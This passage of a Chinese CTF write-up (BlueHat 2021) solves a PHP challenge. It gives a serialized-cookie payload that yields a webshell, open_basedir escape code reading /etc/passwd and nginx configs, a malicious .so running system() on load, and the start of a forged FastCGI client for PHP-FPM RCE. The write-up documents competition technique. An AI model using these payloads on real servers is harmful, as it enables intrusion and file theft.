operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>反序列化<code>cookies-&gt;data</code>使其$count[++$user-&gt;count]=1;后<code>$count[]=1</code>为false即可eval执行命令，伴随应该题目还有更多考点，测试如下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>在 PHP 中，有三种数组类型：</p><ul><li><p>索引数组 - 带有数字索引的数组</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  // key被双引号包裹</p></li><li><p>关联数组 - 带有指定键的数组</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果如下</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>多维数组 - 包含一个或多个数组的数组</p><p>俗称套娃</p></li></ul><p>感兴趣的师傅可以自己测试一下，这里只需要<code>$a-&gt;count=9223372036854775806</code>即long最大值时即可绕过(64位即2^64)</p><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p>直接拿shell进去看看</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>这里用蚁剑示例，注意header里需要加Cookie为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>查看phpinfo，发现有很多disable_function</p><pre class="language-none"><code class="language-none">disable_function：stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>还有open_basedir限制，利用自动化脚本无法突破。由于html目录可写，利用<code>glob://</code>协议先探测目录</p><blockquote><p>glob:// — 查找匹配的文件路径模式</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>再利用如下，读取文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>读取php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>发现异常.so文件，可能是要加载然后pwn它，实在不会。</p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>读<code>/etc/nginx/nginx.conf</code>，发现有<code>include /etc/nginx/sites-enabled/*;</code></p><p>转头读取<code>/etc/nginx/sites-enabled/default</code></p><img src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>发现在9001端口开有FastCGI服务，phpinfo中也表明该项目为FPM/FastCGI，可以通过未授权打FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="加载恶意so文件"><a href="#加载恶意so文件" class="headerlink" title="加载恶意so文件"></a>加载恶意so文件</h3><p>写.so扩展</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>小插曲：这里发现输出到<code>/var/www/html/1</code>发现不行，结果名字换成a就可了，离谱</small></p><p>编译下</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>注意的是用macos和linux编译是不同的，得用linux编译，编译完后上传至<code>/var/www/html</code></p><h3 id="伪造FastCGI请求PHP-CGI"><a href="#伪造FastCGI请求PHP-CGI" class="headerlink" title="伪造FastCGI请求PHP-CGI"></a>伪造FastCGI请求PHP-CGI</h3><p>同样写在html目录</p><blockquote><p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</p><blockquote><p>{<br>‘GATEWAY_INTERFACE’: ‘FastCGI/1.0’,<br>‘REQUEST_METHOD’: ‘GET’,<br>‘SCRIPT_FILENAME’: ‘/var/www/html/index.php’,<br>‘SCRIPT_NAME’: ‘/index.php’,<br>‘QUERY_STRING’: ‘?a=1&amp;b=2’,<br>‘REQUEST_URI’: ‘/index.php?a=1&amp;b=2’,<br>‘DOCUMENT_ROOT’: ‘/var/www/html’,<br>‘SERVER_SOFTWARE’: ‘php/fcgiclient’,<br>‘REMOTE_ADDR’: ‘127.0.0.1’,<br>‘REMOTE_PORT’: ‘12345’,<br>‘SERVER_ADDR’: ‘127.0.0.1’,<br>‘SERVER_PORT’: ‘80’,<br>‘SERVER_NAME’: “localhost”,<br>‘SERVER_PROTOCOL’: ‘HTTP/1.1’<br>}</p></blockquote></blockquote><ul><li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token single-quoted-string string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span 